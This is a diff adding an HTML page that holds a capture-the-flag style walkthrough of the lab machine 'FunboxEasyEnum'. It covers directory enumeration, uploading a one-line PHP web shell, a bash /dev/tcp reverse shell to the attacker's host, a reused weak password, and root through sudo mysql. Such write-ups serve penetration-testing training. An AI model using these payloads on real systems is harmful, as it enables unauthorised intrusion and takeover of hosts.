@@ -1,0 +1,184 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="{% static 'EthHack/css/machines/machines.css' %}">
+</head>
+<body>
+    <h1 class="title">PG Play FunboxEasyEnum</h1>
+    <p class="text">Difficulty : Easy | CommunityRating : intermediate | MyRating : VeryEasy</p>
+    <h2 class="subtitle">Enumeration</h2>
+    <div class="code-box"><pre><code>└─$ <u>sudo nmap -p- -sCV $IP --min-rate=10000</u>
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 9c:52:32:5b:8b:f6:38:c7:7f:a1:b7:04:85:49:54:f3 (RSA)
+|   256 d6:13:56:06:15:36:24:ad:65:5e:7a:a1:8c:e5:64:f4 (ECDSA)
+|_  256 1b:a9:f3:5a:d0:51:83:18:3a:23:dd:c4:a9:be:59:f0 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-title: Apache2 Ubuntu Default Page: It works
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre></div>
+
+
+
+<p class="text">Teally simple output. We can start from HTTP enumeration with no hesitation.</p>
+
+
+<div class="img">
+    <img src="{% static 'EthHack/images/funboxeasyenum/1.png' %}" alt="">
+    <p class="text">There is a default apache2 page. We are not interested here, so I'll enumerate directory.</p>
+</div>
+
+<div class="code-box"><pre><code>└─$ <u>gobuster dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://$IP -t 70</u>
+===============================================================
+/.htpasswd            (Status: 403) [Size: 280]
+/.htaccess            (Status: 403) [Size: 280]
+/.hta                 (Status: 403) [Size: 280]
+/index.html           (Status: 200) [Size: 10918]
+/javascript           (Status: 301) [Size: 323] [--&gt; http://192.168.183.132/javascript/]
+/phpmyadmin           (Status: 301) [Size: 323] [--&gt; http://192.168.183.132/phpmyadmin/]
+/robots.txt           (Status: 200) [Size: 21]
+/server-status        (Status: 403) [Size: 280]
+
+===============================================================</code></pre></div>
+
+<p class="text">There is phpmyadmin page. Though there are several dirs we can visit, they returns 404 forbidden.</p>
+
+<div class="code-box"><pre><code>└─$ <u>gobuster dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://$IP/phpmyadmin -t 70</u>
+===============================================================
+/.htaccess            (Status: 403) [Size: 280]
+/.htpasswd            (Status: 403) [Size: 280]
+/.hta                 (Status: 403) [Size: 280]
+/doc                  (Status: 301) [Size: 327] [--&gt; http://192.168.183.132/phpmyadmin/doc/]
+/favicon.ico          (Status: 200) [Size: 22486]
+/index.php            (Status: 200) [Size: 10531]
+/js                   (Status: 301) [Size: 326] [--&gt; http://192.168.183.132/phpmyadmin/js/]
+/libraries            (Status: 403) [Size: 280]
+/locale               (Status: 301) [Size: 330] [--&gt; http://192.168.183.132/phpmyadmin/locale/]
+/phpinfo.php          (Status: 200) [Size: 10533]
+/setup                (Status: 401) [Size: 462]
+/sql                  (Status: 301) [Size: 327] [--&gt; http://192.168.183.132/phpmyadmin/sql/]
+/templates            (Status: 403) [Size: 280]
+/themes               (Status: 301) [Size: 330] [--&gt; http://192.168.183.132/phpmyadmin/themes/]
+
+===============================================================</code></pre></div>
+
+<p class="text">As the same with above, there are several dirs we can enumerate further, they returns 404 forbidden again. Therefore, we may have to enumerate more drastically. For that, I will use feroxbuster.</p>
+
+<div class="code-box"><pre><code>└─$ <u>feroxbuster -u http://$IP -x php > ferox</u></code></pre></div>
+<p class="text">Then, filter the outputs with '200' response.</p>
+
+<div class="code-box"><pre><code>└─$ <u>cat ferox | grep -E '200'</u>
+200      GET       15l       74w     6147c http://192.168.183.132/icons/ubuntu-logo.png
+200      GET      375l      964w    10918c http://192.168.183.132/
+200      GET      325l      922w     7771c http://192.168.183.132/phpmyadmin/js/codemirror/lib/codemirror.css
+200      GET       19l      102w     8154c http://192.168.183.132/phpmyadmin/themes/pmahomme/img/logo_right.png
+200      GET       26l      359w    10532c http://192.168.183.132/phpmyadmin/themes.php
+200      GET      212l      807w    13316c http://192.168.183.132/phpmyadmin/doc/html/index.html
+200      GET       77l      147w     3068c http://192.168.183.132/phpmyadmin/js/codemirror/addon/lint/lint.css
+200      GET       49l       53w     2061c http://192.168.183.132/phpmyadmin/js/whitelist.php
+200      GET       26l      359w    10531c http://192.168.183.132/phpmyadmin/index.php
+200      GET      170l      365w     2611c http://192.168.183.132/phpmyadmin/themes/pmahomme/css/printview.css
+200      GET      394l     2973w    29261c http://192.168.183.132/phpmyadmin/js/messages.php
+200      GET       98l      278w    35231c http://192.168.183.132/phpmyadmin/favicon.ico
+200      GET     1225l     3355w    35020c http://192.168.183.132/phpmyadmin/themes/pmahomme/jquery/jquery-ui-1.11.4.css
+200      GET       26l      359w    10532c http://192.168.183.132/phpmyadmin/logout.php
+200      GET       26l      359w    10532c http://192.168.183.132/phpmyadmin/export.php
+200      GET       26l      359w    10529c http://192.168.183.132/phpmyadmin/sql.php
+200      GET       26l      359w    10532c http://192.168.183.132/phpmyadmin/import.php
+200      GET       38l       73w      662c http://192.168.183.132/phpmyadmin/js/codemirror/addon/hint/show-hint.css
+200      GET        1l        1w       53c http://192.168.183.132/phpmyadmin/themes/dot.gif
+200      GET      114l      263w     3828c <u>http://192.168.183.132/mini.php</u>
+200      GET       26l      359w    10536c http://192.168.183.132/phpmyadmin/navigation.php
+200      GET       26l      359w    10533c http://192.168.183.132/phpmyadmin/license.php</code></pre></div>
+
+
+<p class="text">Here we discovered mini.php page on the root dir.</p>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/funboxeasyenum/2.png' %}" alt="">
+    <p class="text">This page seems to allow us to upload arbitrary file, and we might be able to upload php file because there is uploaded php file. Let's try it.</p>
+</div>
+
+<h2 class="subtitle">Foothold</h2>
+<p class="text">I simply uploaded simple webshell php file below:</p>
+<div class="code-box"><pre><code>&lt;?php system($_REQUEST[cmd]);?&gt;</code></pre></div>
+
+
+<p class="text">Then, confirm it successfully uploaded with curl command.</p>
+<div class="code-box"><pre><code>└─$ curl -s -G http://192.168.173.132/simple_shell.php? --data-urlencode "cmd=id" 
+uid=33(www-data) gid=33(www-data) groups=33(www-data)</code></pre></div>
+
+<p class="text">Because the test was successful, we can get reverse shell.</p>
+
+<div class="code-box"><pre><code>└─$ curl -s -G http://192.168.173.132/simple_shell.php? --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/192.168.45.177/4444 0>&1'"
+
+
+└─$ nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [192.168.45.177] from (UNKNOWN) [192.168.173.132] 42568
+bash: cannot set terminal process group (1332): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@funbox7:/var/www/html$ </code></pre></div>
+
+<p class="text">We got user www-data.</p>
+
+
+<h2 class="subtitle">PrivEsc</h2>
+
+<p class="text">Before enumerate whole directory on the target machine, we should test if we can change user with password which is the same with username.</p>
+<p class="text">First, we have to stabilize the reverse shell.</p>
+
+<div class="code-box"><pre><code>www-data@funbox7:/var/www/html$ <u>script /dev/null -c /bin/bash</u>
+script /dev/null -c /bin/bash
+Script started, file is /dev/null
+www-data@funbox7:/var/www/html$ <u>^Z</u>
+zsh: suspended  nc -lvnp 4444
+
+
+└─$ stty raw -echo ;fg                                         
+[1]  + continued  nc -lvnp 4444
+                               reset
+reset: unknown terminal type unknown
+Terminal type? screen
+www-data@funbox7:/var/www/html$</code></pre></div>
+
+<p class="text">Then, test it.</p>
+<div class="code-box"><pre><code>www-data@funbox7:/var/www/html$ su goat
+Password: 
+goat@funbox7:/var/www/html$ 
+goat@funbox7:/var/www/html$ id
+uid=1003(goat) gid=1003(goat) groups=1003(goat),111(ssh)</code></pre></div>
+
+<p class="text">We could change user to goat user with password 'goat'.</p>
+
+
+<div class="code-box"><pre><code>goat@funbox7:/var/www/html$ sudo -l
+Matching Defaults entries for goat on funbox7:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User goat may run the following commands on funbox7:
+    (root) NOPASSWD: /usr/bin/mysql</code></pre></div>
+
+    <p class="text">According to sudo -l commond, we can run mysql as root user. </p>
+
+
+<div class="img">
+    <img src="{% static 'EthHack/images/funboxeasyenum/2.png' %}" alt="">
+    <p class="text">Searching the keyword 'mysql' on GTFOBins page revealed that we can easily get root shell with displayed code.</p>
+</div>
+
+
+<div class="code-box"><pre><code>goat@funbox7:/var/www/html$     sudo mysql -e '\! /bin/sh'
+# id
+uid=0(root) gid=0(root) groups=0(root)</code></pre></div>
+
+<p class="text">We got root shell. You can find proof.text on /root and local.txt on /var/www.</p>
+
+</body>
+</html>
